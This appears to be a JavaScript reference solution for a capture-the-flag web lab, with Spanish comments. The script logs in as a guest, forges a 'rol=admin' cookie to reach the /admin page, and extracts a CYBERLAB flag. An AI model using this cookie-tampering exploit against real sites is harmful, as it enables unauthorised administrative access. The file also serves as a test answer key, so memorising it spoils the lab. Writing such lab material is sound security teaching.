// Solución de referencia: iniciar sesión como invitado, ver la cookie `rol` y cambiarla a `admin`.
export default async function solve({ request }) {
  const login = await request("/login", {
    method: "POST",
    headers: { "content-type": "application/x-www-form-urlencoded" },
    body: "usuario=invitado&clave=invitado",
  });
  const setCookie = [].concat(login.headers["set-cookie"] ?? []).join(";");
  if (!/rol=usuario/.test(setCookie)) return null; // la cookie de rol debe existir y ser manipulable
  const admin = await request("/admin", { headers: { cookie: "rol=admin" } });
  return admin.text.match(/CYBERLAB\{[^}]+\}/)?.[0] ?? null;
}
